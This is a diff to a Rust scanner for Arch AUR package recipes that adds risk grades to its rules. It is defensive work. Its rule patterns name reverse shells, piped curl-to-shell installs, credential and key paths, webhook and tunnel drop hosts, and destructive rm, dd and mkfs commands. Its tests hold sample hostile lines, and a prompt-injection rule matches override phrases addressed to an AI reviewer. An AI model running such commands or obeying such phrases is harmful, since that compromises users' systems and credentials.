@@ -1,4 +1,4 @@
-use crate::model::{Evidence, Finding, Severity, Snapshot};
+use crate::model::{Evidence, Finding, Risk, Severity, Snapshot};
 use regex::Regex;
 use std::sync::LazyLock;
 
@@ -50,6 +50,10 @@ struct Rule {
     require_line: Option<Regex>,
     /// Only a line for which this gives the stated answer is reported.
     line_test: Option<(LineTest, bool)>,
+    /// A `review` finding of this rule is of high risk: the package takes
+    /// root-level or lasting power, reaches for credentials, or hides what
+    /// it runs. The others are things legitimate recipes also do.
+    high: bool,
 }
 
 /// Where a command can start on a line: at its beginning; after a separator;
@@ -85,6 +89,7 @@ fn rule(id: &'static str, severity: Severity, message: &'static str, pattern: &s
         ignore_line: None,
         require_line: None,
         line_test: None,
+        high: false,
     }
 }
 
@@ -111,6 +116,10 @@ impl Rule {
         self.ignore = Some(Regex::new(pattern).expect("built-in rule must compile"));
         self
     }
+    fn high(mut self) -> Self {
+        self.high = true;
+        self
+    }
     fn when(mut self, test: LineTest, answer: bool) -> Self {
         self.line_test = Some((test, answer));
         self
@@ -133,33 +142,33 @@ static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
         rule("KNOWN-PAYLOAD", Block, "A package name used in known AUR malware campaigns is installed.", r"\b(?:npm|bun|pnpm|yarn)\s+(?:install|add)\s+(?:atomic-lockfile|js-digest)\b"),
         rule("PRIVATE-KEY", Block, "The recipe refers to private authentication material. Review why it needs access.", r"(?:~|\$HOME|\$\{HOME\})/\.(?:ssh/id_[A-Za-z0-9_]+|aws/credentials|gnupg/private-keys-v1\.d)"),
         rule("REVERSE-SHELL", Block, "A shell is connected to a network socket.", r"\b(?:ba|z)?sh\s+-i\b[^\n]*/dev/(?:tcp|udp)/|\b(?:nc|ncat|netcat)\b[^\n]*\s(?:-[A-Za-z]*e\b|--(?:sh-)?exec\b|-[A-Za-z]*c\s+[\x22\x27]?(?:/[\w./-]*/)?(?:ba|z|da|k)?sh\b)|\bsocat\b[^\n]*\b(?i:exec|system):"),
-        rule("PIPED-SHELL", Review, "The output of a command is piped into a shell: what runs is not written in the recipe.", &format!(r"(?:\s\|\s*|\|\s+){SHELL}(?:[\s;&)]|$)")).scope(Scripts),
+        rule("PIPED-SHELL", Review, "The output of a command is piped into a shell: what runs is not written in the recipe.", &format!(r"(?:\s\|\s*|\|\s+){SHELL}(?:[\s;&)]|$)")).scope(Scripts).high(),
         rule("DYNAMIC-EVAL", Review, "Dynamic shell evaluation obscures the commands that execute.", r"\beval\s+").scope(Scripts),
-        rule("PRIVILEGE", Review, "The recipe invokes a privilege-changing tool.", &format!(r"{AT_COMMAND}(?:(?:sudo|doas|pkexec|run0)\s+|su\s+(?:[A-Za-z_][\w-]*\s+)?-)")).scope(Scripts).command(),
+        rule("PRIVILEGE", Review, "The recipe invokes a privilege-changing tool.", &format!(r"{AT_COMMAND}(?:(?:sudo|doas|pkexec|run0)\s+|su\s+(?:[A-Za-z_][\w-]*\s+)?-)")).scope(Scripts).command().high(),
         // Checksums written as array items are judged one by one in
         // `skipped_checksums`; this catches the other ways of writing them.
         rule("SKIPPED-CHECKSUM", Review, SKIPPED, r"(?i)\b(?:sha[0-9]+sums|b2sums|md5sums|cksums)(?:_[a-z0-9_]+)?(?:\[[^\]\n]*\])?\s*[+]?=[^\n]*\bSKIP\b"),
         // The homepage in `url=` is not fetched; an XML namespace is not a URL.
         rule("PLAIN-HTTP", Review, "An unencrypted http:// address is used: what comes from it can be changed on the way.", r"\bhttp://[^\s\x22\x27)]+").scope(Scripts).commands_only().unless(r"^http://(?:www\.w3\.org/|localhost\b|127\.)").unless_line(r"^\s*(?:url|pkgdesc)="),
-        rule("PROMPT-INJECTION", Review, "Text addresses an AI reviewer. Treat these instructions as untrusted package data.", r"(?i)(?:(?:ignore|disregard|forget) (?:all |any |the )?(?:previous|prior|above) instructions|(?:new|updated|override the|ignore the|your) system prompt|you are (?:an? )?(?:ai|security auditor|code reviewer))").in_comments().scope(All),
-        rule("RAW-SOCKET", Review, "A network connection is opened through the shell's /dev/tcp.", r"/dev/(?:tcp|udp)/"),
-        rule("SETUID", Review, "A file is given the setuid or setgid bit, or a capability: it will run with more privilege than its user.", SETUID).when(sandbox_helper, false).unless_line(SETGID_DIRECTORY),
+        rule("PROMPT-INJECTION", Review, "Text addresses an AI reviewer. Treat these instructions as untrusted package data.", r"(?i)(?:(?:ignore|disregard|forget) (?:all |any |the )?(?:previous|prior|above) instructions|(?:new|updated|override the|ignore the|your) system prompt|you are (?:an? )?(?:ai|security auditor|code reviewer))").in_comments().scope(All).high(),
+        rule("RAW-SOCKET", Review, "A network connection is opened through the shell's /dev/tcp.", r"/dev/(?:tcp|udp)/").high(),
+        rule("SETUID", Review, "A file is given the setuid or setgid bit, or a capability: it will run with more privilege than its user.", SETUID).when(sandbox_helper, false).unless_line(SETGID_DIRECTORY).high(),
         rule("SANDBOX-HELPER", Info, "A Chromium sandbox helper is made setuid root, as Chromium-based applications require.", SETUID).when(sandbox_helper, true),
-        rule("PRIVILEGE-CONFIG", Review, "The recipe touches the configuration that decides who may become root (sudo, doas, PAM or polkit).", r"/etc/sudoers\b|/etc/doas\.conf\b|/etc/pam\.d/|/polkit-1/rules\.d\b"),
-        rule("STARTUP-FILE", Review, "The recipe refers to a shell startup or autostart file of a user: code placed there runs at every login.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+|/root)/\.(?:bashrc|bash_profile|bash_login|profile|zshrc|zprofile|zshenv|xinitrc|xprofile|config/fish/config\.fish|config/autostart)\b|/etc/ld\.so\.preload\b").commands_only(),
-        rule("CREDENTIAL-STORE", Review, "The recipe refers to where browsers, password managers or developer tools keep credentials.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+)/\.(?:mozilla|config/(?:google-chrome|chromium|BraveSoftware|Bitwarden)|local/share/keyrings|password-store|netrc|git-credentials|kube/config|docker/config\.json|config/gh/hosts\.yml)\b|\bwallet\.dat\b").commands_only(),
-        rule("DROP-HOST", Review, "The recipe refers to a paste, file-drop, webhook or tunnel service: places code is fetched from, or data is sent to, without a trace.", &format!(r"(?i)discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|://(?:[a-z0-9-]+\.)*{DROP_HOSTS}\b|(?:^|[\s\x22\x27=(@]){DROP_HOSTS}(?:/|:[0-9])|\b[a-z0-9-]+\.ngrok(?:-free)?\.(?:io|app|dev)\b")),
+        rule("PRIVILEGE-CONFIG", Review, "The recipe touches the configuration that decides who may become root (sudo, doas, PAM or polkit).", r"/etc/sudoers\b|/etc/doas\.conf\b|/etc/pam\.d/|/polkit-1/rules\.d\b").high(),
+        rule("STARTUP-FILE", Review, "The recipe refers to a shell startup or autostart file of a user: code placed there runs at every login.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+|/root)/\.(?:bashrc|bash_profile|bash_login|profile|zshrc|zprofile|zshenv|xinitrc|xprofile|config/fish/config\.fish|config/autostart)\b|/etc/ld\.so\.preload\b").commands_only().high(),
+        rule("CREDENTIAL-STORE", Review, "The recipe refers to where browsers, password managers or developer tools keep credentials.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+)/\.(?:mozilla|config/(?:google-chrome|chromium|BraveSoftware|Bitwarden)|local/share/keyrings|password-store|netrc|git-credentials|kube/config|docker/config\.json|config/gh/hosts\.yml)\b|\bwallet\.dat\b").commands_only().high(),
+        rule("DROP-HOST", Review, "The recipe refers to a paste, file-drop, webhook or tunnel service: places code is fetched from, or data is sent to, without a trace.", &format!(r"(?i)discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|://(?:[a-z0-9-]+\.)*{DROP_HOSTS}\b|(?:^|[\s\x22\x27=(@]){DROP_HOSTS}(?:/|:[0-9])|\b[a-z0-9-]+\.ngrok(?:-free)?\.(?:io|app|dev)\b")).high(),
         rule("NUMERIC-HOST", Review, "A URL points at a numeric address instead of a named host.", r"\bhttps?://(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b").unless(r"://(?:127\.|0\.0\.0\.0|10\.|192\.168\.|169\.254\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)"),
-        rule("PACKAGE-MANAGER", Review, "The recipe runs a package manager itself.", &format!(r"{AT_COMMAND}(?:pacman|yay|paru|pamac|pikaur)\s+(?:-[A-Za-z-]+\s+)*-[A-Za-z]*[SUR][A-Za-z]*")).scope(Scripts).command().unless(r"\s-S[silgpq]+$"),
-        rule("PACKAGE-TRUST", Review, "The recipe changes which packages or keys pacman trusts.", r"\bpacman-key\s+[^\n]*(?:--add|--lsign-key|--lsign\b|--recv-keys|--populate|--import|\s-[a-z]*[ar]\b)|(?:\$\{?pkgdir\}?[\x22\x27]?)?/etc/pacman\.(?:conf\b|d/)|\bSigLevel\b").scope(Scripts).commands_only().unless(r"^\$\{?pkgdir"),
-        rule("ACCOUNT", Review, "An account is given administrative rights, the identity of root, or a new password.", &format!(r"\b(?:usermod|gpasswd|useradd|adduser)\b[^\n]*\b(?:wheel|sudo|root|adm|docker)\b|\buseradd\b[^\n]*(?:\s-[A-Za-z]*o\b|\s-u\s*0\b|--uid[=\s]0\b|--non-unique\b)|\bchpasswd\b|{AT_COMMAND}passwd\s")).scope(Scripts).commands_only(),
-        rule("DISABLE-PROTECTION", Review, "A system protection is switched off.", r"\bsetenforce\s+0\b|\bufw\s+disable\b|\biptables\s+(?:-F|--flush)\b|\bnft\s+flush\s+ruleset\b|\bsystemctl\s+(?:--[a-z-]+\s+)*(?:stop|disable|mask)\s+[^\n]*\b(?:firewalld|ufw|apparmor|auditd|nftables|iptables)\b|\bkernel\.(?:randomize_va_space|kptr_restrict|yama\.ptrace_scope)\s*=\s*0\b").commands_only(),
-        rule("DESTRUCTIVE", Review, "Files are deleted from the filesystem root or a home directory.", &format!(r"{AT_COMMAND}rm\s+(?:-[A-Za-z-]+\s+)+(?:[^\s;&|]+\s+)*[\x22\x27]?(?:/(?:etc|usr|var|boot|home|root|opt|bin|sbin|lib|lib64|srv)?|~|\$HOME|\$\{{HOME\}})/?\*?[\x22\x27]?(?:\s|;|&|$)|{AT_COMMAND}dd\s[^\n]*\bof=/dev/(?:sd|nvme|vd|hd|mmcblk|mapper/)|{AT_COMMAND}(?:mkfs(?:\.[a-z0-9]+)?|wipefs|shred)\s")).scope(Scripts).command(),
+        rule("PACKAGE-MANAGER", Review, "The recipe runs a package manager itself.", &format!(r"{AT_COMMAND}(?:pacman|yay|paru|pamac|pikaur)\s+(?:-[A-Za-z-]+\s+)*-[A-Za-z]*[SUR][A-Za-z]*")).scope(Scripts).command().unless(r"\s-S[silgpq]+$").high(),
+        rule("PACKAGE-TRUST", Review, "The recipe changes which packages or keys pacman trusts.", r"\bpacman-key\s+[^\n]*(?:--add|--lsign-key|--lsign\b|--recv-keys|--populate|--import|\s-[a-z]*[ar]\b)|(?:\$\{?pkgdir\}?[\x22\x27]?)?/etc/pacman\.(?:conf\b|d/)|\bSigLevel\b").scope(Scripts).commands_only().unless(r"^\$\{?pkgdir").high(),
+        rule("ACCOUNT", Review, "An account is given administrative rights, the identity of root, or a new password.", &format!(r"\b(?:usermod|gpasswd|useradd|adduser)\b[^\n]*\b(?:wheel|sudo|root|adm|docker)\b|\buseradd\b[^\n]*(?:\s-[A-Za-z]*o\b|\s-u\s*0\b|--uid[=\s]0\b|--non-unique\b)|\bchpasswd\b|{AT_COMMAND}passwd\s")).scope(Scripts).commands_only().high(),
+        rule("DISABLE-PROTECTION", Review, "A system protection is switched off.", r"\bsetenforce\s+0\b|\bufw\s+disable\b|\biptables\s+(?:-F|--flush)\b|\bnft\s+flush\s+ruleset\b|\bsystemctl\s+(?:--[a-z-]+\s+)*(?:stop|disable|mask)\s+[^\n]*\b(?:firewalld|ufw|apparmor|auditd|nftables|iptables)\b|\bkernel\.(?:randomize_va_space|kptr_restrict|yama\.ptrace_scope)\s*=\s*0\b").commands_only().high(),
+        rule("DESTRUCTIVE", Review, "Files are deleted from the filesystem root or a home directory.", &format!(r"{AT_COMMAND}rm\s+(?:-[A-Za-z-]+\s+)+(?:[^\s;&|]+\s+)*[\x22\x27]?(?:/(?:etc|usr|var|boot|home|root|opt|bin|sbin|lib|lib64|srv)?|~|\$HOME|\$\{{HOME\}})/?\*?[\x22\x27]?(?:\s|;|&|$)|{AT_COMMAND}dd\s[^\n]*\bof=/dev/(?:sd|nvme|vd|hd|mmcblk|mapper/)|{AT_COMMAND}(?:mkfs(?:\.[a-z0-9]+)?|wipefs|shred)\s")).scope(Scripts).command().high(),
         rule("BUILD-DOWNLOAD", Review, "The build downloads something itself, outside the declared sources and their checksums.", &format!(r"{AT_COMMAND}(?:(?:curl|wget|aria2c)\s|git\s+clone\s[^\n]*(?:https?|git|ssh)://|(?:python[0-9.]*|perl|ruby|node|php)\s+(?:-[A-Za-z]+\s+)*-[ce]\s[^\n]*(?:https?://|urlopen|urlretrieve))")).scope(Recipe).command(),
         rule("OUTSIDE-WRITE", Review, "The build writes to the system instead of into the package directory.", r"(?:>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?/(?:etc|usr|opt|var|bin|sbin|lib|lib64|boot|root|home)/").scope(Recipe).commands_only(),
-        rule("INSTALL-DOWNLOAD", Review, "The install script, which runs as root, fetches or installs software itself.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c|git\s+clone|pip3?\s+install|npm\s+(?:i|install|ci)|pnpm\s+(?:i|install|add)|yarn\s+(?:install|add)|gem\s+install|cargo\s+install|go\s+install)\b|{AT_COMMAND}(?:python[0-9.]*|perl|ruby|node|php)\s+(?:-[A-Za-z]+\s+)*-[ce]\s[^\n]*(?:https?://|urlopen|urlretrieve)")).scope(InstallScript).command(),
+        rule("INSTALL-DOWNLOAD", Review, "The install script, which runs as root, fetches or installs software itself.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c|git\s+clone|pip3?\s+install|npm\s+(?:i|install|ci)|pnpm\s+(?:i|install|add)|yarn\s+(?:install|add)|gem\s+install|cargo\s+install|go\s+install)\b|{AT_COMMAND}(?:python[0-9.]*|perl|ruby|node|php)\s+(?:-[A-Za-z]+\s+)*-[ce]\s[^\n]*(?:https?://|urlopen|urlretrieve)")).scope(InstallScript).command().high(),
         rule("SCRIPT-DOWNLOAD", Review, "A script that comes with the recipe downloads something when it runs.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c)\s")).scope(Helper).command(),
-        rule("INSTALL-WRITE", Review, "The install script, which runs as root, writes system configuration itself instead of shipping it as a file of the package.", r"(?:(?:^|[^-=<>])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?/(?:etc|usr|root|boot|var/spool/cron)/|(?:(?:^|[^-=<>0-9])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?\$[{A-Za-z_]|\bsed\s[^\n]*-i[^\n]*\s[\x22\x27]?/(?:etc|usr|root|boot)/|\b(?:cp|mv|ln|install)\s[^\n]*\s[\x22\x27]?/(?:etc/(?:profile|udev/rules\.d|cron|ld\.so|ssh|environment|modprobe\.d|modules-load\.d)|usr/share/libalpm/hooks|root/\.ssh)|\b(?:cp|mv|install)\s[^\n]*\s[\x22\x27]?/etc/systemd/system/|\bauthorized_keys\b|\bsshd_config\b").scope(InstallScript).commands_only(),
+        rule("INSTALL-WRITE", Review, "The install script, which runs as root, writes system configuration itself instead of shipping it as a file of the package.", r"(?:(?:^|[^-=<>])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?/(?:etc|usr|root|boot|var/spool/cron)/|(?:(?:^|[^-=<>0-9])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?\$[{A-Za-z_]|\bsed\s[^\n]*-i[^\n]*\s[\x22\x27]?/(?:etc|usr|root|boot)/|\b(?:cp|mv|ln|install)\s[^\n]*\s[\x22\x27]?/(?:etc/(?:profile|udev/rules\.d|cron|ld\.so|ssh|environment|modprobe\.d|modules-load\.d)|usr/share/libalpm/hooks|root/\.ssh)|\b(?:cp|mv|install)\s[^\n]*\s[\x22\x27]?/etc/systemd/system/|\bauthorized_keys\b|\bsshd_config\b").scope(InstallScript).commands_only().high(),
         rule("INSTALL-SERVICE", Info, "The install script starts, stops or enables a service.", &format!(r"{AT_COMMAND}(?:systemctl\s+(?:--[a-z-]+\s+)*(?:enable|start|restart|disable|stop|mask)\b|ln\s[^\n]*/etc/systemd/[^\s]*\.wants/)")).scope(InstallScript).command(),
         rule("PRELOAD", Info, "A library is preloaded into a program (LD_PRELOAD).", r"\bLD_PRELOAD="),
     ]
@@ -628,6 +637,7 @@ fn skipped_checksums(text: &str, paths: &[&str]) -> (Vec<Finding>, Vec<usize>) {
             _ => (Severity::Review, SKIPPED),
         };
         findings.push(Finding {
+            risk: Default::default(),
             rule_id: "SKIPPED-CHECKSUM".into(),
             source: "deterministic".into(),
             severity,
@@ -1061,6 +1071,7 @@ fn heredoc_marker(line: &[char], mut i: usize) -> Option<(Vec<char>, bool, usize
 pub(crate) fn opaque(snapshot: &Snapshot, baseline: Option<&Snapshot>) -> Vec<Finding> {
     let mut findings = Vec::new();
     let finding = |rule_id: &str, severity, message: String, evidence| Finding {
+        risk: Default::default(),
         rule_id: rule_id.into(),
         source: "deterministic".into(),
         severity,
@@ -1288,6 +1299,31 @@ fn is_script(file: &crate::model::PackageFile) -> bool {
         || file.text.starts_with("#!")
 }
 
+/// How much a finding should weigh with the person deciding.
+///
+/// A note is low and a block is critical. A `review` finding is high when
+/// its rule says so, when it is a blocked command found in printed text, or
+/// when it is about running a file nobody read; otherwise it is medium. A
+/// model's `review` finding is medium: it is an opinion, and when a model
+/// thinks something has no honest use it says `block`.
+pub(crate) fn risk(finding: &Finding) -> Risk {
+    match finding.severity {
+        Severity::Info => Risk::Low,
+        Severity::Block => Risk::Critical,
+        Severity::Review => {
+            let by_rule = RULES
+                .iter()
+                .filter(|rule| rule.id == finding.rule_id)
+                .any(|rule| rule.high || rule.severity == Severity::Block);
+            if finding.source == "deterministic" && (by_rule || finding.rule_id == "OPAQUE-RUN") {
+                Risk::High
+            } else {
+                Risk::Medium
+            }
+        }
+    }
+}
+
 pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
     let mut findings = Vec::new();
     let paths: Vec<&str> = snapshot
@@ -1376,6 +1412,7 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
                 }
                 if rule.id == "PLAIN-HTTP" && verified.contains(&(index + 1)) {
                     findings.push(Finding {
+            risk: Default::default(),
                         rule_id: rule.id.into(),
                         source: "deterministic".into(),
                         severity: Severity::Info,
@@ -1402,6 +1439,7 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
                     // the text may be meant for a shell further on.
                     let advice = rule.severity == Severity::Block && is_message && !runs_text;
                     findings.push(Finding {
+                        risk: Default::default(),
                         rule_id: rule.id.into(),
                         source: "deterministic".into(),
                         severity: if advice {
@@ -1426,6 +1464,7 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
                 }
                 if findings.len() >= 256 {
                     findings.push(Finding {
+                        risk: Default::default(),
                         rule_id: "FINDING-LIMIT".into(),
                         source: "engine".into(),
                         severity: Severity::Block,
@@ -2749,6 +2788,104 @@ mod tests {
                 "{runner}"
             );
         }
+    }
+
+    #[test]
+    fn a_finding_is_graded_by_what_the_package_would_gain() {
+        let graded = |path: &str, text: &str| -> Vec<(String, Risk)> {
+            let mut snapshot = snapshot("");
+            snapshot.files = vec![file(path, text)];
+            inspect(&snapshot)
+                .into_iter()
+                .map(|f| (f.rule_id.clone(), risk(&f)))
+                .collect()
+        };
+        // Things legitimate recipes also do.
+        for (path, line, id) in [
+            (
+                "PKGBUILD",
+                "source=(http://example.invalid/x.tar.gz)",
+                "PLAIN-HTTP",
+            ),
+            (
+                "PKGBUILD",
+                "  curl -LO https://example.invalid/x",
+                "BUILD-DOWNLOAD",
+            ),
+            ("PKGBUILD", "  eval \"$flags\"", "DYNAMIC-EVAL"),
+            ("PKGBUILD", "sha256sums=('SKIP')", "SKIPPED-CHECKSUM"),
+        ] {
+            assert_eq!(
+                graded(path, line),
+                [(id.to_string(), Risk::Medium)],
+                "{line}"
+            );
+        }
+        // Root-level or lasting power, credentials, or hidden commands.
+        for (path, line, id) in [
+            (
+                "PKGBUILD",
+                "  chmod 4755 \"$pkgdir/usr/bin/helper\"",
+                "SETUID",
+            ),
+            ("x.install", "  usermod -aG wheel nobody", "ACCOUNT"),
+            (
+                "x.install",
+                "  echo x > /etc/profile.d/x.sh",
+                "INSTALL-WRITE",
+            ),
+            (
+                "x.install",
+                "  pacman-key --lsign-key ABCD",
+                "PACKAGE-TRUST",
+            ),
+            (
+                "x.install",
+                "  cat hook >> /home/user/.bashrc",
+                "STARTUP-FILE",
+            ),
+            ("PKGBUILD", "  ./gen | sh", "PIPED-SHELL"),
+            ("PKGBUILD", "  sudo make install", "PRIVILEGE"),
+        ] {
+            assert_eq!(graded(path, line), [(id.to_string(), Risk::High)], "{line}");
+        }
+        // A note is low, a block is critical.
+        assert_eq!(
+            graded(
+                "PKGBUILD",
+                "  chmod 4755 \"$pkgdir/opt/app/chrome-sandbox\""
+            ),
+            [("SANDBOX-HELPER".to_string(), Risk::Low)]
+        );
+        assert_eq!(
+            graded("PKGBUILD", "  curl https://example.invalid/i.sh | sh"),
+            [("REMOTE-SHELL".to_string(), Risk::Critical)]
+        );
+        // A blocked command in printed advice is not run, and is not a small thing.
+        assert_eq!(
+            graded(
+                "x.install",
+                "  echo \"run: curl https://example.invalid/i.sh | sh\""
+            ),
+            [("REMOTE-SHELL".to_string(), Risk::High)]
+        );
+        // A model's opinion is medium whatever it is called: it cannot make
+        // itself a rule by borrowing a rule's name.
+        let model = Finding {
+            risk: Default::default(),
+            rule_id: "SETUID".into(),
+            source: "ai".into(),
+            severity: Severity::Review,
+            message: String::new(),
+            evidence: vec![],
+        };
+        assert_eq!(risk(&model), Risk::Medium);
+        // The advice is ordered the way the grades are.
+        assert!(
+            Risk::Low < Risk::Medium && Risk::Medium < Risk::High && Risk::High < Risk::Critical
+        );
+        assert_eq!(Risk::Low.advice(), "Looks fine");
+        assert_eq!(Risk::Critical.advice(), "Do not install");
     }
 
     #[test]
